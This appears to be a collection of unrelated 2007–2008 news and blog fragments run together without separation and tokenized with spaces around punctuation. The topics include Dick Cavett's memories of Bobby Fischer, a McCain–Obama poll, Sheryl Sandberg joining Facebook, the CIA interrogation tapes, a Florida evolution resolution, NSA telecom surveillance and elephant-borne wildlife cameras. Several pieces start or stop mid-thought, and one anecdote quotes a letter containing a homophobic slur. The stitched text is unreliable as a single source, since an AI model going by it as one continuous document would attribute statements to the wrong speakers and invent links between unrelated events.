And win — at the age of thirteen .
When asked what happened , he said , “ I got better . ”
What does such dedication to seemingly unreachable goals — until he reached them — do to the rest of you , the over - achiever ?
Touchingly , when he returned to my show after having disposed of Spassky , triumphant in the eyes of the world , he opined that he might be wise to try developing some of the rest of himself .
He had begun to see that a life of nothing but chess was “ kind of limited . ”
( He went to dinner in Reykjavik with friends .
“ Bobby could n’t follow the conversation , ” one said .
“ He sort of backed into the corner , got out his little pocket chess set and played with himself . ” )
He announced on my show that he was now “ reading a lot of magazines , trying to keep up with what ’s going on in the world . ”
He was still in his twenties .
Until the advent of Bobby Fischer , my image of a young chess genius was not flattering .
I pictured a sort of wizened and unpopular youth , small of frame , reclusive , short , with messy hair , untended acne , thick glasses and shirt sticking out in back .
And also perhaps , as the great V. Nabokov wrote in describing somewhat genderless piano prodigies with eye trouble , obscure ailments , “ and something vaguely misshapen about their eunuchoid hindquarters . ”
**********
Getting Fischer on my show that first time , before the big match , was considered a major catch at the time .
If anyone in the audience shared my image of what a chess genius probably looked like , Bobby ’s entrance erased it .
Here was no Nabokovian homunculus .
There appeared , somewhat disconcerted , a tall and handsome lad with football - player shoulders , impeccably suited , a little awkward of carriage and unsure how to negotiate the unfamiliarity of the set , the bright lights , the wearing of make - up , the band music , the hand - shaking and the thundering ovation — all at the same time .
I had hoped to avoid the cliché “ gangling , ” but Bobby gangled .
He sort of lurched into his chair .
Once seated , he was something to behold .
Six foot two ( tall in those days ) , athletic in build , perfect in grooming , and with striking features .
The face radiated intelligence .
You could n’t confuse him with anyone you ’d ever seen .
And there were the eyes .
Cameras fail to convey the effect of his eyes when they were looking at you .
A bit of Svengali perhaps , but vulnerable .
And only the slightest hint of a sort of theatrical menace , the menace that so disconcerted his opponents .
Looking out over the audience , I could clearly see entranced women gazing at him as if willing to offer their hearts — and perhaps more — to the hunky chess master .
When I asked him about such matters , he said that the awful demands of his life — the global travel ; the constant study , sometimes until dawn , followed by play ; the punishing five - hour sessions at full concentration , day after day — all this made it “ pretty hard to . . . [ hesitates ] . . . build up a relationship . ”
He seemed quite surprised with himself , as did friends watching , that he had allowed so revealing a moment .
( That old Cavett magic , no doubt . )
One thing he said in that first appearance became famous .
At one point I asked him what , in terms of thrills , the chess equivalent might be of , say , hitting a home run .
His answer : “ I like the moment when I break a man ’s ego . ”
There was a trace of a chill in his laughter .
For me , watching the Fischer shows after all this time contained quite a few surprises .
For example , I winced watching the first one when I heard myself use the word “ paranoid . ”
That awful word that in the later , bad years became almost part of Bobby ’s name .
But back then it passed unnoticed .
On the post - Spassky show it was Bobby himself who uttered the p-word .
I re-winced .
He claimed that Harold C. Schonberg , then the Times ’ music and chess critic , “ said I was paranoid . ”
Somehow the joker in me came up with , “ No he did n’t .
You ’re imagining it . ”
Happily he got the joke — a beat before the audience did — and laughed heartily .
( People who who knew him were in disbelief that he could actually laugh and be funny on the show . )
He did n’t know it , but I had spotted him earlier that day .
We were walking to my studio at the same time , but from opposite directions .
He towered over passersby who would stop in their tracks and gaze worshipfully .
From a distance , you could see the consonants in his name on their lips : B , F .
He seemed unaware of them , with his ever - present little transistor radio clapped to his ear like a teenager .
He had come to like soul music , he said .
That night Tony Randall was on , which Bobby enjoyed , and both of us inquired about his reported loutish behavior in Reykjavik that nearly prevented the Great Match from happening , what with his incessant demands and threats to walk out and accusing the Russians of cheating and demanding to have the swimming pool to himself .
( They had actually promised him that in their eagerness to get him . )
Bobby , looking thoughtful , surprised lots of people with , “ I ’m afraid that a lot of what I did was . . . not too bright . ”
[ Friendly laughter ]
Crazy as it sounds , the paranoia was not all on one side in Reykjavik .
The Russians demanded that Bobby ’s chair be taken apart , so they could look for a hidden device that Spassky thought might be causing him to feel hypnotized .
Bobby loved it .
Randall had vastly amused the audience when he told a story about a piece of hate mail that came to him not at his own show but , of all places , at the old “ Opera Quiz ” weekend radio show with its presumably cultured and genteel limited audience .
Tony was a sometime panelist .
The nasty letter began , “ The only thing more disgusting than watching a faggot like you on television is when you go on Dick Cavett ’s and having to watch you two faggots sit there together , yakking like two faggots , ” etc .
The audience was hysterical .
Fischer , having watched this from backstage , came out to a long ovation .
Wanting to dispel the myth that he and Spassky were non-speaking enemies , he insisted that despite all the gossipy press to the contrary , he and Boris were truly quite good friends , and went bowling together .
“ Really buddy - buddy , ” he said , adding , “ not like you two , of course . ” [ Booming laughter . ] )
Tony asked him if he ’d like to be on “ The Odd Couple . ”
Bobby ’s “ maybe ” fetched a healthy laugh .
With a little pressing about could he imagine another life for himself , he confessed to having given some thought to becoming an actor .
If he had been able to use all that was in him , he might have proved a forerunner of the genius actor , Javier Bardem .
Fine actors can use a touch of madness .
( Geo. C. Scott , with several touches , comes to mind . )
Bobby had acquitted himself stylishly as a guest on “ The Bob Hope Show . ”
Strange to think that at that time Bobby was known to even more people even than his world - famous host .
I could n’t help wondering if Bobby F. knew who Bob H. was until then .
“ He ’s a funny guy , ” Bobby allowed .
**********
Our mental health advisers , shrinks and friends advise us to avoid guilt at all costs .
But they do n’t tell you how .
There seems to be an unlimited number of guilts available to us .
When someone we know — or are related to — comes apart and deteriorates physically and mentally and commits suicide , do n’t most of us think , “ Maybe I ’d have been the one who could have made the difference ; done or said this or that and saved the poor soul ? ”
How much of such thinking is charitable and how much egotistical ?
For a time I was pained by that thought that I might have been Bobby ’s salvation .
But then we comfort ourselves , concluding that of course it would have been too late .
And then , alas , comes , But would it have been ?
I like to think I would have gladly boarded a plane and tracked Bobby down — in whichever of his far - flung refuges around the globe he was holing up in — and tried to be of help .
But how would he have , as they say , received me ?
Would I still be one of the few ( some said only ) people Bobby ever really liked ?
Might pathology have erased memory ?
Would I have been utterly forgotten ?
Or a Jew bastard , sent to further hurt him ?
( Bobby ’s mother was Jewish , as was his biological father , who left when Bobby was two . )
The thought that he might have been delighted to see me and that I might have brought him even brief pleasure — parted the clouds for him for a while — is hard to think about .
Because it means I should have done it .
This is going to always haunt me .
Somewhere on the internet I ran across a picture of the later , ailing Bobby .
I do n’t know where it was and do n’t want to see it again .
It ’s a color head - shot .
It ’s not pleasant to see how the magnificent edifice had crumbled .
He looks ancient , is balding and that great face that shone with intelligence is all but hidden by a massive growth of white beard .
It could be an actor playing King Lear .
He is facing the camera but the eyes are cut sharply to one side .
They look both suspicious and frightened .
Those great Fischer eyes of old have been replaced .
They ’re not these .
**********
I ’m surprised in writing this how much emotion there still is in the subject for me .
There ’s no story like it : genius kid , precocious , plunged into triumphant victory , money and world fame — no one under 30 should be subjected to fame — then gradual decline into raving lunatic .
“ Those whom the gods would destroy , they first make mad . ”
You ’d think , with all the hells Bobby descended through in his allotted 64 years , that those gods could have spared him the agony of kidney disease — a notoriously painful way to die .
A Sioux friend of mine likes to quote , “ Count no man lucky until he has had a good death . ”
If there be such a thing as a place of rest , I hope that Robert James Fischer has found it .
I ’ve sat for a while trying to figure out how to close A faint glimmer of a bit of poetry had been swimming elusively in my head , just out of reach .
And then it emerged .
It ’s from E.E.Cummings ’ famous poem about another lionized and legendary figure who , after triumph and glamour , also did not have “ a good death ” : Buffalo Bill .
With Cummings ’ quirky punctuation , it ’s a short poem , with no title but referred to by its first three words : “ Buffalo Bill ’s / defunct . ”
Its closing lines somehow seem appropriate here .
They are :
Jesus
he was a handsome man
and what I want to know is
how do you like your blue - eyed boy

Poll : Republicans say Obama , Clinton smarter than McCain RAW STORY
Published : Tuesday March 4 , 2008
|
Print This Email This McCain doubles Obama on confidence in national security While Sen. John McCain has nearly wrapped up the Republican presidential nomination , he apparently still has n't wrapped up his own party .
According to a new Fox News / Washington Times / Rasmussen reports poll out today , Republicans like Sen. Barack Obama ( D - IL ) nearly as much as they like McCain .
The survey -- of likability -- is n't indicative of whether they 'd vote for Obama over their own nominee -- but it could suggest problems for McCain down the road , should Obama become the Democratic nominee .
Equally troubling for Republicans is that the survey showed that party supporters think Obama is smarter than McCain .
" Despite facing candidates with far more experience in government , [ Obama ] was rated smartest by 26 percent of those polled , more so than Mrs. Clinton , who won 22 percent , and Mr. McCain , who garnered 17 percent , " the Washington Times write Tuesday .
" Mr. Huckabee , a former Arkansas governor , was fourth with 10 percent . "
Excerpts follow .
The survey determined that a quarter of self - identified Republicans rated Mr. McCain most likable , but nearly as many  23 percent  chose Mr. Obama as most likable .
And among all adults surveyed , Mr. Obama was rated likable by more people than Sen. Hillary Rodham Clinton and Mr. McCain combined , underscoring the Illinois senator 's appeal to voters across the political spectrum .
" There is something about Barack Obama that is hard to capture in polling and it's an enthusiasm , it 's a freshness , it 's an excitement he can generate that will certainly be a factor in the campaign , " said pollster Scott Rasmussen .
Mr. Obama said his message and his brand of campaigning will help him compete in states traditionally hostile to Democrats , and the poll numbers suggest an opening for that approach .
By contrast , likability has never been Mr. McCain 's strong suit  even long - shot Republican candidate Mike Huckabee was rated more likable in the poll , both among all adults and Republicans specifically .
Mr. McCain instead is betting on his national - security credentials , and there the survey shows him topping both Democrats combined ....
Mr. Obama also was wildly popular among independents and third - party members , 41 percent of whom rated him most likable .

SAN FRANCISCO  Mark Zuckerberg of Facebook is not stepping aside for a chief executive as Larry Page and Sergey Brin did at Google or as Jerry Yang and David Filo did at Yahoo .
He is following the Bill Gates model and holding the top post as he hires a Google executive , Sheryl Sandberg , as chief operating officer .
Ms. Sandberg , currently vice president for global online sales and operations at Google , joined the search giant in 2001 and helped develop its immensely lucrative online advertising programs , AdWords and AdSense .
She will join Facebook later this month to work closely with Mr. Zuckerberg , a co-founder of Facebook , the company said Tuesday .
“ A big theme of this hire is that there are parts of our operations that , to use a pretty trite phrase , need to be taken to the next level , ” Mr. Zuckerberg said in an interview .
Ms. Sandberg will help Facebook expand overseas and develop an advertising network that will help justify its carbonated $ 15 billion valuation , set last year when Microsoft invested $ 240 million for 1.6 percent of the company .
She will also oversee Facebook ’s marketing , human resources and privacy departments  essentially guiding how Facebook presents itself and its intentions to the outside world .
Ms. Sandberg ’s departure is a blow to Google , where she was a well - regarded executive .
“ Sheryl was a valued member of the Google team and we wish her well in her new endeavors , ” Omid Kordestani , Google ’s senior vice president for global sales and business development , said in an e-mail statement .
Mr. Kordestani said David Fischer would take over Ms. Sandberg ’s job .
Until now , Mr. Fischer was vice president for online sales and operations , reporting to Ms. Sandberg .

Many US arrivals from Europe are not screened
He said militant attacks and plots in Europe over recent years had made the US aware of the " real risk that Europe will become a platform for terrorists " .
Mr Chertoff said it was likely security checks on travellers from Europe would be increased .
But he said steps would be taken to ensure travel and trade were not hit .
In the interview on the BBC's World News America , Mr Chertoff said he had seen " home - grown terrorism begin to rise in Europe " .
I have to say the biggest threat comes from overseas , and one of the places we are increasingly worried about is Europe

He cited deadly bomb attacks on Madrid and London , and a terror alert affecting UK - US flights in August 2006 , as well as " people travelling from South Asia and the Middle East into Europe and carrying out attacks there " .
He said it was important to increase security checks on passengers from Europe - most of whom are currently able to enter the United States without being screened first because of a visa waiver programme .
But Mr Chertoff added that immigration checks should not affect travel and trade - an important part of the US economy .
As the fifth anniversary of the creation of his Homeland Security department approaches , Mr Chertoff said the US was now a safer place because of the security strategies that had been adopted .
" Our ability to know who is coming across our borders , and to check them and to take their fingerprints now , is far better than it was five or six years ago , " Mr Chertoff said .
" We have deployed almost twice as many border patrols as we had five or six years ago .
We 've put up literally hundreds of miles of fencing and barriers .
" All of these are very concrete steps forward that have made our security much better than it was , " Mr Chertoff said .
Facebook wants to turn every member into a spokesman for its advertisers .
Mark Zuckerberg , the founder and chief executive of the superhot social network , today announced what the company calls “ social ads . ”
The ads expand what has been one of the most powerful features of Facebook , the news feed , where members see a list of what their friends are doing  photos from their parties , new friends , favorite bands and so on .
Facebook now will give advertisers the ability to create their own profile pages on its system that will let users identify themselves as fans of a product .
Each user ’s news feed will contain items like “ Bobby Smith is now a fan of Toyota Prius . ”
News feeds can be linked to outside Web sites as well , so users can tell friends about what they rented at Blockbuster or are auctioning on eBay .
‘ Cars that ca n’t crash ’ unveiled by Thatcham
It sounds like a sci - fi fantasy – cars that ca n’t crash !
But the fictional notion is about to become reality thanks to new technologies being fitted to vehicles driven in Britain – that in time could save more than 125,000 injuries each year .
Thatcham – the insurer funded research centre – unveiled three revolutionary systems at a major European media conference held at The Transport Research Laboratory ( Tuesday February 12th ) .
The systems mitigate and in some cases prevent low speed shunts and collisions – the most common type of accident – which creates billions of pounds worth of damage to vehicles and untold pain and misery to motorists and their passengers .
This type of accident makes up no less than 75 percent of all motor accidents .
Thatcham – the not for profit organisation which strives to make vehicles safer – has been putting the cutting edge technologies to the test .
So are crash test dummies heading for the employment centre or an early retirement in the sun ?
Matthew Avery , Thatcham Research Manager – Crash , said : “ These systems are a massive breakthrough for keeping motorists safe .
Vehicle manufacturers should be congratulated for developing and introducing this technology which is significant for the safety of all UK road users .
Collision avoidance systems represent the future of accident and injury reduction on UK roads .
“ They will make a major impact on the number of slow speed accidents – in Britain and across the World .
“ Thatcham believes that if manufacturers embrace the new systems and fit them as standard – more than 125,000 injuries will be prevented each year in Britain alone .
“ It will take a number of years before enough cars in the UK ‘ car parc ’ are fitted with the technology – but once a threshold is reached injury figures will tumble .
“ Most accidents involve two or more vehicles – so every car fitted with the kit can save damage and injury to multiples of others .
” Thatcham has been evaluating three different systems :
The Volvo City Safety – which will be fitted as standard to their XC60 which will be on sale from November .
The system is active at up to 20 mph .
It uses a form of laser radar ( LIDAR ) mounted in top of the windscreen .
It is programmed to respond if the vehicle in front is either at a standstill or is moving in the same direction as the car itself .
The brakes are pre-charged and should a collision be imminent it applies them and cuts the throttle .
If the car is travelling below 10 mph it should prevent the collision entirely and at a speed of up to 20 mph will reduce the impact by 50 % .
The Mercedes Distronic Plus is currently available on some S - class models .
It uses two radar systems linked to the car ’s cruise control system to maintain a safe distance between you and the car in front .
It provides a continual calculation of the distance between the vehicle in front and the speed differential between them and will bring the car to a complete stop if necessary .
The Honda CMBS currently on the CR - V is a radar system that again calculates the distance and the speed differential with the vehicle in front .
Should this become out of kilter the driver receives visual and audible warnings before brakes are progressively activated .
Seat belts are also tightened to alert the driver of an impending problem and lessen any resulting injuries .
Commenting on Thatcham test results Matthew Avery said : “ All three systems offer enhanced protection – the Volvo in particular impressed because of its autonomous operation and the fact that it intervened at the last second and can completely avoid a crash .
“ It is imperative that driver vigilance is not lowered by the inclusion of such systems in their vehicles .
“ These systems should not allow the driver to compensate – and take additional risks .
“ The car is not the driver – the driver drives the car .
“ This is just the beginning of the collision avoidance revolution .
We will see systems that can detect pedestrians and other vulnerable road users and even steer the car to avoid a crash . ”
If God is allowed in the Constitution , man must abdicate .
There is no room for both .
If the people of the great Republic become superstitious enough and ignorant enough to put God in the Constitution of the United States , the experiment of self - government will have failed , and the great and splendid declaration that “ all governments derive their just powers from the consent of the governed ” will have been denied , and in its place will be found this :
All power comes from God ; priests are his agents , the people are their slaves .

The Real CIA Tapes Scandal That Everyone is Ignoring
Marty Lederman
As recent reports demonstrate , the broad outlines of the CIA tapes destruction story is becoming increasingly clear .
If yesterday ’s story in the Washington Post is any indication , it ’s a tale the CIA itself appears eager to promulgate .
The gist of it is this :
The CIA realized that the tapes depicted governmental conduct that was at the very least horrifying , and that most observers would likely consider criminal .
They were afraid that if those tapes ever saw the light of day , the CIA interrogation program would come in for severe public rebuke , with the possibility of criminal prosecution to the extent any interrogators went beyond the broad permissive authorizations provided by OLC .
So they were eager to destroy the tapes .
They sought approval for such destruction from the White House and the Justice Department , but the lawyers there persistently " advised " the CIA not to destroy the tapes .
As long as the 9/11 Commission was operating , the CIA could not destroy the tapes because such destruction would then be clearly unlawful .
But when the Commission closed up shop , mid-level CIA lawyers Steven Hermes and Robert Eatinger told Jose Rodriguez that the destruction would then be lawful .
( This advice was probably equivocal and might well have been mistaken .
In light of the potential breadth of the broadly worded federal obstruction statutes , and the warnings that had been repeatedly given to the CIA not to destroy the tapes , it is unlikely that good lawyers could have advised Rodriguez that the coast was clear with any degree of confidence . )
Rodriguez knew that if he asked anyone else , he might get conflicting legal advice , or even a directive not to destroy .
And if Rodriguez did n’t ask for a direct order one way or the other , no one was eager to give him one .
According to one congressional official who spoke to Pam Hess , " if you look at the documents , you get very close to a direct order ( not to destroy the tapes ) without it being , ' Jose , you 're not going to do this . ' "
CIA General Counsel John Rizzo " advised " against the destruction .
And then - CIA Director Porter Goss " recommended " against it .
These are the verbs of officials who hope their advice goes unheeded : Notably , no one actually instructed Rodriguez not to destroy the tapes , or that it would be illegal to do so .
Rodriguez therefore interpreted the repeated failure of his superiors to require retention of the tapes as an implicit green light to destroy — and he may well have been right about that , as a practical ( if not a legal ) matter .
( " Well , we advise against it , but it ’s your call - – nudge nudge ; wink , wink . " )
So he went ahead and ordered the tapes destroyed .
I imagine this is the basic story that the congressional committees will uncover .
( They are holding their hearings in secret , which seems to me to be indefensible and likely a huge mistake .
But that ’s another story . )
Thus , I suspect that nothing much new of any importance will be revealed in those hearings — but who knows ?
( Did Hermes and Eatinger tell Rizzo of their advice to Gonzales ?
If not , what ’s the possible explanation for the failure to do so ? )
Whether the DOJ investigation reveals any criminal wrongdoing is , of course , another matter entirely , and may well depend on what advice Rodriguez received , and what his mens rea was .
( Personally , I think it would be unfortunate to point the finger exclusively at Rodriguez and others at his level and below .
The obvious wrongdoers were those in the CIA and White House who implicitly or expressly condoned the destruction by repeatedly failing to say " no . "
But it is , of course , much more difficult to establish criminal culpability for such willful blindness .
As many at the CIA feared all along , the political folks who pushed for the program have left the career officials holding the bag . )
These investigations are important .
But they are obscuring the much larger scandal here .
Of course , the largest scandal of all — one that John Durham apparently is not investigating — is that the interrogations themselves were part of a concerted CIA program in violation of the criminal prohibition against torture , and in breach of the Geneva and Torture Conventions , a program sanctioned at the highest levels of government , and approved by countless professional lawyers , doctors , government officials , and psychologists .
That ’s why the tapes were destroyed — because they were stark evidence of wrongdoing , perhaps even of war crimes .
But even sticking to the tapes themselves , the greater scandal is not that these tapes were destroyed , but instead that the CIA did not create tapes of all its high - level interrogations .
That is to say , the real outrage was the orders from the CIA to stop taping .
No one is talking about this .
( Well , perhaps no one except Spencer Ackerman , over at the new and promising Washington Independent . )
But it is really rather remarkable that the CIA decided not to videotape its investigations of high - level al Qaeda officials .
This is an enemy bent on committing horrifying terrorist acts .
Our intelligence about that enemy is minimal , and therefore any information we obtain from these interrogations could be of critical importance .
( That was , recall , the justification for the “ enhanced ” techniques in the first place . )
We have not used these techniques in the past , and we are uncertain how effective they will be .
It ’s a learning process .
Moreover , the information gleaned from these interrogations , presumably in a foreign language not known to most of the officials dealing with the terrorist threat , might be quite difficult to interpret .
It may be very hard at first to understand just which responses from the detainees are important and which are not , and how their responses fit into the broader intelligence - gathering efforts of the intelligence agencies .
Under the government ’s frequently invoked “ mosaic ” theory of intelligence gathering , one might not know the true value of particular intelligence for some time , until it can be viewed in a broader context , alongside a great deal of other intelligence collected before and after .
More than likely , the information can best be understood and appreciated only by officials not present during the investigations .
According to the Post story , Rodriguez himself told several colleagues that the taping was necessary “ so that experts , such as psychologists not present during interrogations , could view Zubaida ’s physical reactions to questions . ”
According to this very important story in the L.A .
Times last month , videotaping is among the current “ best practices ” of intelligence agencies around the globe — “ an essential tool in improving the methods -- and results -- of terrorism interrogations , ” not to mention an invaluable research and teaching tool in determining which techniques work .
Magnus Ranstorp , a veteran counter - terrorism expert with the Swedish Defence College , goes so far as to say that if agencies do n’t save and analyze tapes of their interrogations , “ they have been derelict in their duty . ”
All of which is to say that tapes of these interrogations would almost certainly be the holy grail of intelligence about al Qaeda .
From the perspective of good government and fighting the war on terror , it is crazy not to videotape these investigations .
And yet the CIA issued directives not to do so .
( One can only imagine how CIA employees must have reacted when Michael Hayden wrote them last month that the tapes of the Abu Zubaydah interrogations were “ not relevant to any internal . . . inquiries . ”
The idea that tapes of al Qaeda investigations are not relevant to the intelligence community ’s efforts to understand the enemy — that written summaries of the interrogations are an adequate substitute — is risible .
Hayden could not possibly believe it himself , and I suspect his audience was incredulous . )
And this is before we even get to the value of such tapes for possible criminal proceedings , and their possible value for officials in Congress or commissions ( e.g. , the 9/11 Commission ) who are trying to understand the nature of the enemy and its threats .
There are only two explanations for this .
First , the CIA knew that the tapes would depict conduct of very dubious legality .
Second , and relatedly , if interrogators know they are being videotaped , they might be much more careful about staying on the legal side of the line — and the CIA wants them not to hesitate to go right up to that line , and sometimes to cross it .
In other words , the explanations for ceasing the taping are basically illegitimate .
And , as it turns out , Congress can do something about this .
Perhaps it should stop focusing quite so much on what happened in the past ( which one hopes Durham will cover ) , and instead make more efforts to ensure that it never happens again .
There is a convenient vehicle for accomplishing this .
Rush Holt , Chair of the House Select Intelligence Oversight Panel , has introduced H.R. 4660 , which would require the President to take necessary actions to ensure the videotaping of all strategic interrogations of , and other pertinent interactions with , detainees or prisoners in the custody or control of the U.S. Congress should enact this law .
It is only a matter of time , I think , before it will be the law virtually everywhere in the U.S. that law enforcement interrogations must be videotaped ( at the very least , as a condition of admissibility of evidence ) .
Other countries , such as Great Britain and Canada , already require either audio or video recordings of interrogations .
At least two states do so , as well ( Alaska and Minnesota ) , and at least four other jurisdictions have such a requirement for at least some cases ( D.C. , Illinois , Maine , and Texas ) .
There have been similar proposals in numerous other jurisdictions .
The American Bar Association has unanimously accepted a resolution that urges law enforcement agencies across the country to videotape interrogations .
Studies , such as this one and the one discussed here , have concluded that recording interviews with suspects is a “ powerful law enforcement tool , ” and the experiences of law enforcement agencies with the practice has been “ uniformly positive . ”
There is virtually no downside .
When such requirements are first proposed , they invariably are opposed by law enforcement officials and entities .
And therefore , at first one often finds legislative resistance .
But when it becomes clear that such a requirement has numerous benefits , and almost no serious costs , such resistance wanes .
The most notable case occurred in Illinois , where in 2003 a junior state senator sponsored a bill to require videotaping of interrogations and confessions in capital cases .
At first there was strong opposition .
But that senator — someone you might have heard of more recently — continued to press his colleagues , arguing that there is no compelling argument against such a requirement -- and that it is a boon to law enforcement .
Eventually , thanks largely to his efforts , the bill passed unanimously in the Illinois Senate , was signed by a governor who was a former prosecutor , and is now state law in Illinois .
The Holt bill , H.R. 4660 , would provide the benefits where they are even more important -- in the context of federal intelligence - based interrogations .
This is legislation that deserves much more attention than it has thus far received ( namely , zero ) .
Reporting on Clay County and St Johns County January 17 , 2008 22:42 MST
One of our visitors ( DC ) left a description of what happened in Clay County .
Keep those reports coming .
On a somewhat more somber note , rumors have it that “ some folks may have been receiving threats and personal attacks ” .
Such attacks and threats are not only illegal but also very counter productive .
I hope that those people reading PT can focus on the scientific vacuity of Intelligent Design , the fact that many ID proponents agree that ID does not provide an alternative theory and the fact that many of these people seem to be confused by the meaning of such terminologies as theory and fact .
Educate not alienate …
DC wrote :
The Clay County School Board just approved a modified form of the resolution by a vote of 5 - 0. 22 of the 27 speakers at the meeting opposed the resolution and they covered pretty much all the bases .
Some were quite eloquent , including several retired pastors .
The five supporters said nothing we had n’t heard before although the word dogma and its variants showed up a lot when referring to Darwinism .
Two ( Including a teacher at my own school .
Sigh. ) emphasized teaching all the “ facts ” and letting students decide .
I was surprised that the local churches did n’t try to pack the meeting room until someone pointed out that this did n’t start to get publicity until after last Sunday ’s services .
The resolution that passed had two , maybe three significant wording changes made .
In paragraph two , the word “ fact ” at the end of the last line was changed to “ theory . ”
The new line reads , “ … direct the Florida Department of Education to revise the new Sunshine State Standards for Science so that evolution is clarified as a theory . ”
The last paragraph was also modified so that the last phrase reads , “ … revise the new Sunshine State Standards for Science such that evolution is designated as a theory . ”
I think they also voted to change the word “ concept ” in the standard to theory ( nobody on the board was too sure of what the difference was , the lawyer for the board would n’t say anything without first looking it up in a dictionary , and nobody wanted to ask the two actual standards writers in the audience what the difference might mean . )
It was all reminiscent of Bacon ’s tale of the monks trying to figure out how many teeth a horse has with none of them willing to just look in its mouth and count .
I ’m pretty sure they made the change but it was getting late .
One of the board members said we would n’t have spent two hours discussing the resolution if evolution was a fact .
I was n’t surprised that the resolution passed but I was dumbfounded when a board member asked about the origins of the resolution , who wrote it and who brought it to the board , and our superintendent , David Owens said he was responsible for , “ all of the above . ”
He said later that he worked with Paula Barton to write and distribute it .
A couple of us are working to get a copy of the recording of the meeting ( video and audio ) .
Earlier in the meeting Owens said that everybody in the room was obviously passionate about their ideas and beliefs .
He asked how many concepts in science changed over the years when the information changed ?
How did we know evolution would n’t do likewise .
We should n’t be so dogmatic about this .
We should pass this resolution because it reflects our beliefs .
Beliefs equals experimental data .
No wonder we have such low science scores down here .
The attorney for the board said that the resolution came as close as possible to violating the Kitzmiller decision without actually crossing the line .
The board members were , I think , voting on this as a CYA thing and at least three of them said it would n’t make a difference with the state BOE anyway .
Maybe if we start good science education now we can have more scientifically literate adults on school boards in the future .

Although facing no shortage of competition , Coffee Break Spanish ( iTunes - Feed - Web Site ) has remained the most popular foreign language lesson podcast , bar none .
The popularity rankings on iTunes have continually attested to that .
From this position of strength , the producers of Coffee Break Spanish have smartly moved into new European territories , rolling out earlier this year MyDailyPhrase Italian ( iTunes - Feed - Web Site ) and MyDailyPhrase German ( iTunes - Feed - Web Site ) .
Now they will be facing a stiffer challenge – trying to penetrate the already - crowded French language lesson market .
Coffee Break French ( iTunes - Feed - Web Site ) was launched on September 26 , and how it fares against the competition ( see our list below ) depends mainly on whether the podcast delivers French lessons better than the others , and whether it can capitalize on the established " Coffee Break " brand .
Stay tuned .

China 's rapid development has triggered concerns over pollution
Production of ultra - thin plastic bags will also be banned , the State Council said in a statement .
Instead , people will be encouraged to use baskets or reusable cloth bags for their shopping , the council said .
The move comes amid growing concern about pollution and environmental degradation in China .
China was using huge quantities of plastic bags each year , the State Council , China 's cabinet , said in its directive , posted on the main government website .
" Plastic shopping bags , due to reasons such as excessive use and inefficient recycling , have caused serious energy and resources waste and environment pollution , " it said .
Easily discarded
Of particular concern were cheap , flimsy bags that many shopkeepers routinely handed out to customers .
" The super - thin bags have especially become a main source of plastic pollution as they are easy to break and thus disposed of carelessly , " the statement said .
Shops that violated the new rules could be fined or have their goods confiscated , it said .
The council also called for greater recycling efforts from rubbish collectors , and suggested financial authorities should consider higher taxes on the production and sale of plastic bags .
In recent years , China 's rapid development has triggered concerns over pollution and use of resources .
But correspondents say that there is a growing awareness that more needs to be done to protect the environment .
Via The New York Times :
For months , the Bush administration has waged a high - profile campaign , including personal lobbying by President Bush and closed - door briefings by top officials , to persuade Congress to pass legislation protecting companies from lawsuits for aiding the National Security Agency ’s warrantless eavesdropping program .
But the battle is really about something much bigger .
At stake is the federal government ’s extensive but uneasy partnership with industry to conduct a wide range of secret surveillance operations in fighting terrorism and crime .
The N.S.A. ’s reliance on telecommunications companies is broader and deeper than ever before , according to government and industry officials , yet that alliance is strained by legal worries and the fear of public exposure .
To detect narcotics trafficking , for example , the government has been collecting the phone records of thousands of Americans and others inside the United States who call people in Latin America , according to several government officials who spoke on the condition of anonymity because the program remains classified .
But in 2004 , one major phone carrier balked at turning over its customers ’ records .
Worried about possible privacy violations or public relations problems , company executives declined to help the operation , which has not been previously disclosed .
Read on ...
This article has exposed even more Bush administration lies and confirmed what many of us have suspected for some time .
It 's not all about international terrorism .
It appears the programs are being used for domestic crime fighting and there are more companies involved with the programs than previously revealed -- and the programs include capturing data that is strictly domestic .
In other words , the very core of our judicial system appears to have been thrown out the window and we still have no idea how bad things really are .
Senate Majority Leader Harry Reid is poised to roll over for President Bush and give telecommunications companies amnesty in the latest FISA legislation , but luckily , Senator Chris Dodd is ready to filibuster .
In light of this newly revealed program , and the likelihood that they may run even deeper , amnesty should be completely out of the question .
Write to Harry Reid or your Senator and tell them that telecom amnesty is not an option and that further oversight and investigation into these programs is needed before any FISA laws are passed .
Guiliani's Daughter Supports Obama
Well , that 's embarassing .
We knew that Rudy Guiliani's two kids are estranged from him since he dumped their mother for his mistress ( and now third wife ) , but this is just humiliating for the candidate .
According to her Facebook page , Rudy 's daughter Caroline supports Barack Obama for president , not her own father .
She lists her political affiliation as liberal and -- up until reporters started hounding her this morning -- was a member of the Barack Obama support group " Barack Obama ( One Million Strong for Barack ) . "
After Slate broke the story and reporters started calling and emailing her , Caroline removed the mention of the Obama support group , but still lists herself as a liberal .
Rudy has not attended any of Caroline 's high school events , although he did show up at her graduation .
But he did n't even speak to his daughter nor did he participate in the graduation festivities with his ex-family .
Guiliani's son , Andrew , who is a junior at Duke , has not been shy in telling reporters how unhappy he is with his father 's behavior towards his mother and his family .
Andrew has also discussed how he objects to his father 's marriage to Judith Nathan .
You remember Judith , right ?
The week before 9/11 , the cover of People magazine screamed " The Mayor , His Wife and His Mistress . "
The story went on to detail how Rudy moved his mistress into Gracie Mansion , humiliating his wife and children .
Rudy can yell " 9/11 Changed Everything ! " all he wants on TV , but Rudy 's kids do n't seem impressed .
By contrast , Chelsea Clinton is always by her mother 's side and is a passionate , poised and polished speaker on her mother 's behalf .
It does not look good to voters when your own family does n't think you 're qualified to be president .
You just know John McCain thinks the whole thing is hilarious .

We revealed the amazing story of how four tiger cubs were captured on special cameras in logs carried by elephants - giving the most intimate insight into their early lives ever recorded .
Now , we show for the first time other creatures of the jungle caught in this extraordinary - and pioneering - way .
Cheeky langur monkeys , a rare sloth bear , spotted deer and a leopard with her cub are just some of the other animals that film - maker John Downer came across in his fascinating experiment .

Spot the difference :
Two playful leopards get in a tangle
Ready for my close - up :
These leaf - eating langurs are monkey puzzled by the camera
Nothing 's beyond my reach :
This curious langur monkey seems eager to be hands on
He fixed webcams to four elephants .
One carried a " trunk - cam " - a device resembling a huge log concealing a camera which could be held in its trunk and dangled close to the ground .
Another had a " tusk - cam " hooked over its tusk .
The elephants moved so steadily that the images are pin-sharp .
Other log -cams were left on the forest floor .
The high - definition cameras were created by inventor Geoff Bell for a documentary in the remote Pench National Park in Madhya Pradesh in the heart of India .
Downer used them to record the first two years of the cubs ' lives .
